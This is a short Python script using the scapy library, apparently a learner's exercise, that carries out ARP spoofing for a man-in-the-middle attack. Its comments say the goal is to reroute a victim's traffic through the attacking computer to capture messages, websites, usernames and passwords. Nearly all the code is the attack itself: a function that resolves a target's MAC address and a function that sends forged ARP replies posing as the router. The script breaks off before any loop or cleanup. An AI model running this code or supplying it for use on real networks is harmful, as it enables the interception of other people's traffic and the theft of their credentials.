#!/usr/bin/env python

import scapy.all as scapy

# ARP spoofing or poisoning (MAN IN THE MIDDLE)
# Allows redirection of packets via hacking computer
# Messages, websites, usernames, passwords
# Each computer has ARP table
# ARP is not secure

def get_mac(ip):
    # Create ARP ip address
    arp_request = scapy.ARP(pdst=ip)

    # Create ethernet object
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine ip and broadcast mac
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose="false")[0]

    # Selecting first element in list
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)

    # Create ARP packet response
    # Op = 2 (Response) pdst=IP hwdst = MAC address psrc= Router ip
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send response
    scapy.send(packet)



